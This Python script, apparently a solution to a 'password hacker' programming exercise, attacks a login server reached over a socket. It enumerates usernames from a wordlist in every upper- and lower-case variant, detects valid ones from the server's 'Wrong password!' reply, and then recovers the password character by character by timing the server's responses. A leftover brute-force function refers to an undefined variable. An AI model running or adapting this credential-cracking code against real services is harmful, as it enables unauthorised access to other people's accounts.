import socket
import sys
import itertools
import json
import datetime

pw_file = 'Insert Path'
login_file = 'Insert Path'
letters = 'abcdefghijklmnopqrstuvwxyz'
digits = '0123456789'

# Handle command line arguments to connect to server
ip = sys.argv[1]
port = int(sys.argv[2])
address = (ip, port)

# Method used for previous stages
def previous_breaker(client):
    i = 1
    while True:
        possible_passwords = itertools.product(characters, repeat=i)
        for pw in possible_passwords:
            pw = ''.join(pw)
            client.send(pw.encode())
            if client.recv(1024).decode() == 'Connection success!':
                return pw
        i += 1


def socket_connect(server):
    with socket.socket() as client:
        client.connect(server)
        for pw in pw_breaker(pw_file):
            pw = ''.join(pw)
            client.send(pw.encode())
            if client.recv(1024).decode() == 'Connection success!':
                return pw

# Returns all possible combinations of pos_pw (string or list)
def pw_breaker(pos_pw):
    combinations = []
    for c in pos_pw:
        if c.isdigit():
            combinations.append(c)
        else:
            combinations.append((c, c.upper()))

    return itertools.product(*combinations)

# Sends msg to server and returns reponse of server and how long that response took
def send_and_get(msg):
    global client
    msg = json.dumps(msg)
    client.send(msg.encode())
    start_time = datetime.datetime.now()
    response = client.recv(1024).decode()
    end_time = datetime.datetime.now()
    time_dif = end_time - start_time
    return json.loads(response), time_dif.total_seconds()


def find_pw(login_info):
    real_pw = ''
    time_dict = {}

    # Finds the password by finding the character of each place one at a time
    while True:

        # Goes through every letter and digit and charts the time in time_dict
        for character in itertools.chain(letters, letters.upper(), digits):
            login_info["password"] = real_pw + character
            pw_response, time_check = send_and_get(login_info)
            time_dict[character] = time_check

            # Checks if password is correct
            if pw_response["result"] == "Connection success!":
                return login_info

        # Determines the character that took the longest and sets it as the character
        avg_time = sum(time_dict.values()) / len(time_dict.values())
        for character, t in time_dict.items():
            if t > avg_time:
                avg_time = t
                c_longest = character

        real_pw = real_pw + c_longest


with socket.socket() as client:
    client.connect(address)

    # Finding the right login
    with open(login_file) as file:
        for line in file.readlines():
            line = line.replace('\n', '')

            #Sends a possible login to server until it responds "Wrong password!"
            for login in pw_breaker(line):
                login = ''.join(login)
                json_login = {"login": login, "password": ' '}
                login_response = send_and_get(json_login)[0]
                if login_response["result"] == "Wrong password!":
                    break

            else:
                continue

            break

        # Finds the right password
        correct_login = find_pw(json_login)

print(json.dumps(correct_login))

#print(socket_connect(address))
